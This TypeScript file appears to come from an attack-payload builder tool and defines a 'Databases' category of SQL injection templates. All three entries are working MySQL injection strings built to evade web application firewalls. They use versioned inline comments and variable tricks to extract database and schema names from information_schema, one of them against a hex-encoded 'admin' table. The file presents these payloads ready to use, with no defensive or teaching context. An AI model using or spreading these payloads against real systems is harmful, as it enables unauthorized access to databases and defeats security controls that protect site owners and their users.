import { BuilderSubcategory } from '../../types';

export const databaseSubcategory: BuilderSubcategory = {
  id: 'database',
  label: 'Databases',
  description: 'WAF bypass database schema extraction templates',
  templates: [
    {
      id: 'waf-db-names-group-concat',
      name: 'DATABASE_NAMES group_concat() WAF',
      description: 'Schema name extraction with inline comment bypass',
      content: '(/*!50000SELECT*//*!50000GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)*//*!50000FROM*//*!50000INFORMATION_SCHEMA.SCHEMATA*/)'
    },
    {
      id: 'waf-db-names-one-shot',
      name: 'DATABASE_NAMES one shot WAF',
      description: 'One shot schema extraction using WAF comment bypass',
      content: '(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+/*!50000(INFORMATION_SCHEMA.SCHEMATA)*/+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x)'
    },
    {
      id: 'waf-db-name-from-table-name',
      name: 'DATABASE_NAME Frm Table Name WAF',
      description: 'Extract schema name from tables using versioned comment',
      content: "(/*!50000SELECT*//*!50000GROUP_CONCAT(0x3c62723e,table_schema)*/+FROM+{f+information_schema.tables}+WHERE+table_name=0x61646d696e)"
    }
  ]
};

